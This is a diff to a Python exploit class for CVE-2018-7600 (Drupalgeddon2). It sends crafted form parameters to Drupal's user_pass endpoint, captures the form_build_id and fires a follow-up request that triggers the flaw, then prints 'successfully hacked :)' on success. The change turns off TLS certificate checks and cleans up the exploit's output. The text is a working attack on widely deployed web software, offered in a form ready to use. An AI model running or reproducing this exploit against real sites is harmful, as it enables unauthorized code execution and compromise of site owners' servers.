@@ -28,16 +28,17 @@ class CVE2018_7600:
             'name[#type]' : 'markup'
         }
         data = {'form_id' : 'user_pass', '_triggering_element_name' : 'name'}
-        r = self.session.post(self.url, data = data, params = params)
+        r = self.session.post(self.url, data = data, params = params, verify = False)
         print (LogColors.YELLOW + "request: " + self.url + "..." + LogColors.ENDC)
         m = re.search(r'<input type="hidden" name="form_build_id" value="([^"]+)" />', r.text)
         if m:
             form_id = m.group(1)
             params = {'q' : 'file/ajax/name/#value/' + form_id}
             data = {'form_build_id' : form_id}
-            print (LogColors.YELLOW + "found:" + form_id + LogColors.ENDC)
-            r = self.session.post(self.url, data = data, params = params)
-            print (LogColors.YELLOW + r.text + LogColors.ENDC)
+            print (LogColors.YELLOW + "found: " + form_id + LogColors.ENDC)
+            r = self.session.post(self.url, data = data, params = params, verify = False)
+            result = r.text.split('[{"command":"settings"')[0].strip("\n")
+            print (LogColors.YELLOW + result + LogColors.ENDC)
             print (LogColors.GREEN + "successfully hacked :)" + LogColors.ENDC)
         else:
             print (LogColors.RED + "failed. not vulnerable :(" + LogColors.ENDC)
